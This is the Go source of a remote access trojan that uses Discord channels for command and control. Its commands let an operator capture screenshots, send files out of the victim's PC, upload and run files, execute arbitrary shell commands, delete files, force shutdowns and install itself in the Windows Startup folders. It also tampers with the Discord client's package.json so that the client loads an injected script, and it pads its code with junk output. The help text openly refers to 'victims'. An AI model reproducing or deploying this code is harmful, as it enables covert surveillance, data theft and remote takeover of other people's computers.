package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/sacOO7/gowebsocket"
)

var CHANNELID string

func IsElevated() bool {
	cmd := exec.Command("openfiles")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	if strings.Contains(string(output), "administrative") {
		return false
	} else {
		return true
	}
}
func Connect(auth string) {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	socket := gowebsocket.New("wss://gateway.discord.gg/?v=9&encoding=json")
	socket.OnConnected = func(socket gowebsocket.Socket) {
		log.Println("Connected")
		properties := &IdentifyProperties{
			Os:      "Windows",
			Browser: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
			Device:  "Kali",
		}
		theData := &IdentifyData{
			Token:      auth,
			Properties: *properties,
			Intents:    513,
		}
		data := &Identify{
			Op:   2,
			Data: *theData,
		}
		out, err := json.Marshal(data)
		if err != nil {
			log.Panicln(err)
		}
		final := string(out)
		socket.SendText(final)

		CHANNELID = CreateChannel(os.Getenv("username"))
		fmt.Printf("CHANNELID: %v\n", CHANNELID)
		msg := APIMessage{
			Content: "New session with " + os.Getenv("username") + " Admin:" + strconv.FormatBool(IsElevated()),
		}
		SendToChannel(CHANNELID, msg)
	}
	socket.OnTextMessage = func(message string, socket gowebsocket.Socket) {
		var payload interface{}
		json.Unmarshal([]byte(message), &payload)
		mg := payload.(map[string]interface{})
		switch mg["t"] {
		case "MESSAGE_CREATE":
			var a MessageOP
			json.Unmarshal([]byte(message), &a)
			msg := a.D
			HandleMSG(msg)
		}
	}
	socket.OnDisconnected = func(err error, socket gowebsocket.Socket) {
		log.Println(err)
		log.Println("Disconnected.")
		return
	}

	socket.Connect()
	for i := 0; i < 1; i-- {
		log.Println("Sending Heartbeat")
		a := HeartBeat{
			Op: 1,
			D:  "",
		}
		e, _ := json.Marshal(a)
		fmt.Println(string(e))
		socket.SendText(string(e))
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()
		time.Sleep(time.Millisecond * 4125)
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		fmt.Println(rand.Int())
		fmt.Println("Hello  world!")
		ChangeJson()

	}
	for {
		select {
		case <-interrupt:
			log.Println("interrupt")
			socket.Close()
			return
		}
	}
}

func CreateChannel(name string) string {
	reqData := ChannelCreate{
		Name: name,
		Type: 0,
	}
	postData, _ := json.Marshal(reqData)
	req, err := http.NewRequest("POST", "https://discord.com/api/guilds/"+guildID+"/channels", bytes.NewBuffer(postData))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Authorization", Token)
	req.Header.Add("Content-Type", "application/json")
	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer res.Body.Close()
	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	var c Channel
	log.Println(string(data))
	err = json.Unmarshal(data, &c)
	if err != nil {
		log.Fatal(err)
	}
	return c.Id
}

func HandleMSG(msg Message) {
	if msg.ChannelID != CHANNELID {
		return
	}
	if msg.Author.Id == "908697752203042837" {
		return
	}
	if !strings.HasPrefix(msg.Content, "!") {
		return
	}
	args := strings.Split(msg.Content, " ")
	cmd := strings.ToLower(strings.Replace(args[0], "!", "", 1))
	fmt.Println(cmd, args)
	if cmd == "upload" {
		for _, file := range msg.Attachments {
			url := file.Url
			filename := file.Filename
			resp, err := http.Get(url)
			if err != nil {
				ErrorMessage(CHANNELID)
			}
			defer resp.Body.Close()
			out, err := os.Create(filename)
			if err != nil {
				ErrorMessage(CHANNELID)
			}
			defer out.Close()
			_, err = io.Copy(out, resp.Body)
			if err != nil {
				ErrorMessage(CHANNELID)
			}
		}
	}
	if cmd == "killdiscord" {
		var discords []string
		output, _ := exec.Command("cmd", "/c", "tasklist").Output()
		stringData := string(output)
		log.Println(stringData)
		if strings.Contains(stringData, "Discord.exe") {
			discords = append(discords, "discord")
		}
		if strings.Contains(stringData, "DiscordCanary.exe") {
			discords = append(discords, "discordcanary")
		}
		if strings.Contains(stringData, "DiscordDevelopment.exe") {
			discords = append(discords, "discorddevelopment")
		}
		if strings.Contains(stringData, "DiscordPTB.exe") {
			discords = append(discords, "discordptb")
		}
		log.Println(discords)
		for _, discord := range discords {
			cmd, _ := exec.Command("cmd", "/c", "taskkill", "/IM", discord+".exe", "/F").Output()
			fmt.Println(string(cmd))
		}
		for _, discord := range discords {
			local := os.Getenv("localappdata")
			cmd := exec.Command(local+"\\"+discord+"\\Update.exe", "--processStart", discord+".exe")
			cmd.Start()
		}
	}
	if cmd == "screenshot" {
		a, err := screenshot.CaptureDisplay(0)
		if err != nil {
			ErrorMessage(CHANNELID)
		}
		filename := os.Getenv("programdata") + "\\screenshot.png"
		file, _ := os.Create(filename)
		defer file.Close()
		png.Encode(file, a)
		client := &http.Client{}
		res, _ := UploadMultipartFile(client, "https://discord.com/api/channels/"+CHANNELID+"/messages", "files[0]", os.Getenv("programdata")+"\\screenshot.png")
		defer res.Body.Close()
		da, _ := ioutil.ReadAll(res.Body)
		log.Println(string(da))
	}
	if cmd == "run" {
		file := strings.Replace(strings.Join(args, " "), "!run ", "", 1)
		cmd := exec.Command("cmd", "/c start "+file)
		cmd.Start()
	}
	if cmd == "dir" {
		output, _ := exec.Command("cmd", "/c", "dir").Output()
		os.WriteFile(programdata+"\\cache.txt", output, 0644)
		client := &http.Client{}
		res, _ := UploadMultipartFile(client, "https://discord.com/api/channels/"+CHANNELID+"/messages", "files[0]", os.Getenv("programdata")+"\\cache.txt")
		defer res.Body.Close()
		os.Remove(os.Getenv("programdata") + "\\cache.txt")
	}
	if cmd == "cd" {
		cd := strings.Replace(strings.Join(args, " "), "!cd ", "", 1)
		err := os.Chdir(cd)
		path, _ := os.Getwd()
		message := APIMessage{
			Content: path,
		}
		if err != nil {
			SendToChannel(msg.ChannelID, message)
		}
		SendToChannel(msg.ChannelID, message)

	}
	if cmd == "help" {
		content := `!dir - shows current working directory
!run - runs a file on users machine
!screenshot - attempts to take a screenshot of users machine
!killdiscord - kills victims discord
!upload - upload any attachment to users machine
!msg <text> - sends a message to the victims machine
!cd <path> - changes working directory of victim
!uacbypass - attempts to bypass user account control (high risk for antivirus)
!getfile <path> - sends file of the victims pc on the specified path`
		msg := APIMessage{
			Content: content,
		}
		SendToChannel(CHANNELID, msg)
	}
	if cmd == "uacbypass" {

	}
	if cmd == "msg" {
		text := strings.Replace(strings.Join(args, " "), "!msg ", "", 1)
		exec.Command("msg", "*", text).Start()
	}
	if cmd == "getfile" {
		path := strings.Replace(strings.Join(args, " "), "!getfile ", "", 1)
		client := &http.Client{}
		_, err := UploadMultipartFile(client, "https://discord.com/api/channels/"+CHANNELID+"/messages", "files[0]", path)
		if err != nil {
			ErrorMessage(msg.ChannelID)
		}
	}
	if cmd == "restart" {
		exec.Command("cmd", "/c", "shutdown", "/r", "/t", "1", "/p").Start()
	}
	if cmd == "shutdown" {
		exec.Command("cmd", "/c", "shutdown", "/s", "/t", "1", "/p").Start()
	}
	if cmd == "cmd" {
		var Args []string = []string{"/c"}
		args = strings.Split(strings.Replace(strings.Join(args, " "), "!cmd ", "", 1), " ")
		Args = append(Args, args...)
		out, err := exec.Command("cmd", Args...).Output()
		if err != nil {
			ErrorMessage(msg.ChannelID)
		}
		os.WriteFile(os.Getenv("temp")+"\\out.txt", out, 0644)
		client := &http.Client{}
		UploadMultipartFile(client, "https://discord.com/api/channels/"+msg.ChannelID+"/messages", "files[0]", os.Getenv("temp")+"\\out.txt")
		os.Remove(os.Getenv("temp") + "\\out.txt")
	}
	if cmd == "startup" {
		if !IsElevated() {
			ErrorMessage(msg.ChannelID)
			return
		}
		executable, _ := os.Executable()
		username := os.Getenv("username")
		_, err := copyy(executable, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\shell.exe")
		_, er := copyy(executable, "C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shell.exe")
		if err != nil {
			ErrorMessage(msg.ChannelID)
			log.Println(err)
		}
		if er != nil {
			ErrorMessage(msg.ChannelID)
			log.Println(err)
		}
	}
	if cmd == "delfile" {
		path := strings.Replace(strings.Join(args, " "), "!delfile ", "", 1)
		err := os.Remove(path)
		if err != nil {
			ErrorMessage(msg.ChannelID)
		}
	}
}
func ChangeJson() {

	var discords []string
	var injectPath []string
	files, _ := os.ReadDir(os.Getenv("localappdata"))
	for _, file := range files {
		filename := file.Name()
		if strings.Contains(filename, "iscord") {
			discords = append(discords, os.Getenv("localappdata")+"\\"+filename)
		}
	}
	for _, discord := range discords {
		pattern := discord + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\package.json"
		files, _ := filepath.Glob(pattern)
		for _, file := range files {
			injectPath = append(injectPath, file)
		}
	}
	text := `{"name":"discord_desktop_core","version":"0.0.0","private":"true","main":"` + strings.Replace(os.Getenv("programdata"), "\\", "/", 1) + `\\SHELLD\\index.js"}`
	for _, file := range injectPath {
		os.WriteFile(file, []byte(text), 0644)
	}
}
